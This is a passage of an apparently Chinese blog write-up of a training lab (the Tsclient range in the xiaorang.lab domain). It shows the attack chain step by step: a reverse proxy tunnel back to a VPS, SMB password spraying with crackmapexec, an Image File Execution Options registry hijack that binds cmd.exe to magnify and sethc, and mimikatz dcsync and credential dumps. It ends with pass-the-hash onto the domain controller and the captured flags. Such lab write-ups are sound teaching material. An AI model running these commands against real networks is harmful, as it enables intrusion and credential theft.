+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Vps端 ./Stowaway_admin -l <span class="number">1234</span> -s <span class="number">123</span></span><br><span class="line">入口机器 C:/Users/Public/windows_x64_agent.exe -c Vps-Ip:<span class="number">1234</span> -s <span class="number">123</span> --reconnect <span class="number">8</span></span><br><span class="line">Vps端</span><br><span class="line">use <span class="number">0</span></span><br><span class="line">socks <span class="number">6666</span></span><br><span class="line"></span><br><span class="line">打开Proxifier和Kali上的Clash就可以了</span><br></pre></td></tr></table></figure>
+
+<h2 id="kju8P">内网打点</h2>
+用刚才的密码进行喷洒
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb <span class="number">172.22</span><span class="number">.8</span><span class="number">.0</span>/<span class="number">24</span> -u <span class="string">&#x27;Aldrich&#x27;</span> -p <span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span></span><br><span class="line">SMB         <span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span>     <span class="number">445</span>    WIN19-CLIENT     [*] Windows <span class="number">10</span> / Server <span class="number">2019</span> Build <span class="number">17763</span> x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:<span class="literal">False</span>) (SMBv1:<span class="literal">False</span>)</span><br><span class="line">SMB         <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>     <span class="number">445</span>    WIN-WEB          [*] Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span> x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:<span class="literal">False</span>) (SMBv1:<span class="literal">True</span>)</span><br><span class="line">SMB         <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>     <span class="number">445</span>    WIN2016          [*] Windows Server <span class="number">2016</span> Datacenter <span class="number">14393</span> x64 (name:WIN2016) (domain:xiaorang.lab) (signing:<span class="literal">False</span>) (SMBv1:<span class="literal">True</span>)</span><br><span class="line">SMB         <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>     <span class="number">445</span>    DC01             [*] Windows Server <span class="number">2022</span> Build <span class="number">20348</span> x64 (name:DC01) (domain:xiaorang.lab) (signing:<span class="literal">True</span>) (SMBv1:<span class="literal">False</span>)</span><br><span class="line">SMB         <span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span>     <span class="number">445</span>    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_PASSWORD_EXPIRED </span></span><br><span class="line">SMB         <span class="number">172.22</span><span class="number">.8</span><span class="number">.18</span>     <span class="number">445</span>    WIN-WEB          [-] WIN-WEB\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_LOGON_FAILURE </span></span><br><span class="line">SMB         <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span>     <span class="number">445</span>    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_PASSWORD_EXPIRED </span></span><br><span class="line">SMB         <span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span>     <span class="number">445</span>    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!<span class="comment"># STATUS_PASSWORD_EXPIRED </span></span><br><span class="line"></span><br><span class="line"><span class="number">172.22</span><span class="number">.8</span><span class="number">.15</span> 可以改密码</span><br><span class="line"><span class="number">172.22</span><span class="number">.8</span><span class="number">.31</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span></span><br><span class="line">这几台都提示密码过期STATUS_PASSWORD_EXPIRED，</span><br></pre></td></tr></table></figure>
+
+<p>先用<code>kali</code>的<code>rdesktop</code>进入登录页面再改密码（windows的rdp不支持用过期密码进入登录界面）（学长说的），只有46可以登录</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop <span class="number">172.22</span><span class="number">.8</span><span class="number">.46</span> -u Aldrich -d xiaorang.lab -p <span class="string">&#x27;Ald@rLMWuy7Z!#&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>RDP登录的时候，用户名是<code>xiaorang.lab\Aldrich</code>（域名\用户名）</p>
+<h2 id="sfuQk">提权2</h2>
+镜像劫持提权：通过修改指定注册表项实现程序的劫持，即运行指定程序实际上运行的是我们自己的后门程序
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path <span class="string">&quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot;</span> | fl *</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739869881421-8acf3eb0-e249-495e-a695-987a3c78f476.png"></p>
+<p>其中<code>Authenticated Users</code>指的是所有非来宾用户</p>
+<ul>
+<li><code>SetValue</code>：允许用户修改注册表项的值。例如，可以更改某个键值的数据内容。</li>
+<li><code>CreateSubKey</code>：允许用户在该注册表项下创建新的子项。</li>
+<li><code>ReadKey</code>：允许用户读取注册表项的键值和子项信息。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">把cmd绑定在放大镜上</span><br><span class="line">reg add <span class="string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot;</span> /v <span class="string">&quot;Debugger&quot;</span> /t REG_SZ /d <span class="string">&quot;c:\windows\system32\cmd.exe&quot;</span> /f</span><br><span class="line">或者劫持到粘滞键 sethc（按 <span class="number">5</span> 次 shift 出现）</span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot;</span> /v Debugger /t REG_SZ /d <span class="string">&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739870350933-39c2cb90-7fae-474a-9874-ce8a1e5ae975.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag02：flag&#123;<span class="number">54866798</span>-<span class="number">6502</span>-4feb-877e-845292b12db7&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="hir0S">横向域控</h2>
+`systeminfo`，主机名是`win2016`，那么对应的机器账户是`win2016$`，
+
+<p>机器账户是在计算机加入域的过程中创建的，从某种意义上来说，是计算机以机器账户的身份加入了域，但是net user &#x2F;domain不会显示机器账户</p>
+<p><code>net group &quot;Domain admins&quot; /domain</code>，恰好有<code>win2016$</code>，直接导出<code>win2016</code>的机器hash即可</p>
+<p><code>net group &quot;Domain Computers&quot; /domain</code> 查看机器用户</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd c:\Users\Aldrich\Desktop</span><br><span class="line">mimikatz.exe <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> exit dcsync攻击</span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> exit 直接抓本机密码也行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739870829700-9e5e64b8-7a6a-47d3-98af-63861d832265.png"></p>
+<p>用<code>smbexec.py</code>进行PTH</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 administrator@172.22.8.15 -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/40918973/1739872954987-6effc537-83b8-413a-bc11-f7eeace4b0ac.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag03: flag&#123;c2daba6b-5930-4dfd-820d-4e7b42cf0e82&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/NekoSec">Projects</a></li>
+        
+          <li><a href="/links/">Friend Links</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#vJ2Py"><span class="toc-number">1.</span> <span class="toc-text">外网打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWMEH"><span class="toc-number">2.</span> <span class="toc-text">提权1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#osZai"><span class="toc-number">3.</span> <span class="toc-text">后渗透1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mEcTG"><span class="toc-number">4.</span> <span class="toc-text">内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#aEZQu"><span class="toc-number">5.</span> <span class="toc-text">代理搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kju8P"><span class="toc-number">6.</span> <span class="toc-text">内网打点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sfuQk"><span class="toc-number">7.</span> <span class="toc-text">提权2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hir0S"><span class="toc-number">8.</span> <span class="toc-text">横向域控</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&text=春秋云境-Tsclient"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&is_video=false&description=春秋云境-Tsclient"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=春秋云境-Tsclient&body=Check out this article: http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&title=春秋云境-Tsclient"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&name=春秋云境-Tsclient&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Tsclient/&t=春秋云境-Tsclient"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2077
+    Plazx
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/NekoSec">Projects</a></li><!--
+     --><!--
+       --><li><a href="/links/">Friend Links</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+  <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?4d0e9f82e790a82153825a1c24f344dc";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+        </script>
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
